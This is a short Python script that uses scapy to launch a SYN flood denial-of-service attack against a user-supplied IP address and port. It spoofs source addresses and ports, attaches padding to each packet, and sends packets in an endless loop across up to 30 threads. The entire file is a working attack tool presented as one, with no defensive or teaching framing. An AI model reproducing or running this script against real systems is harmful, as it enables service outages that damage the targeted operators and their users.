#! /usr/bin/python3
import sys
import threading

from scapy.all import *


def syn_flood(target_ip, target_port):          
    ip_spoof = RandIP('192.168.0.0/24') # Hidding the real IP address
    random_port = RandShort()
    
    # Building the packet (stacking layers)
    ip = IP(src=ip_spoof, dst=target_ip)     
    tcp = TCP(sport=random_port, dport=target_port, flags='S') # SYN FLOOD
    packet_size = 1024
    data = Raw(b'D'*packet_size)
    packet = ip/tcp/data

    send(packet, loop=1, verbose=0) # Send packet in a loop until CTRL+C          


def main():
    print('\t/-------------- DOS ATTACK (SYN FLOOD) --------------/')   
    try:            
        target_ip = input('[*] Enter Target IP Address: ')                              
        target_port = int(input('[*] Enter the Target Port: '))               
        try:
            intensity = int(input('[*] Enter DOS intensity (1, 2 or 3): '))
            if intensity > 3 or intensity < 1:
                print('[~] ERROR, Invalid intensity')
        except:
            print('[~] ERROR, Invalid intensity')
    
    except KeyboardInterrupt:        
        print('\n[!] Exiting...')
        sys.exit(1)

    threads = []
    for index in range(10 * intensity):            
        thread_ = threading.Thread(target=syn_flood, args=(target_ip, target_port), daemon=True)
        threads.append(thread_)
        thread_.start()
    
    print('[!] DOS started...')
    input('[*] Press any key to stop.\n')
    print('[!] DOS successfuly done.')

    
if __name__ == '__main__':
    main()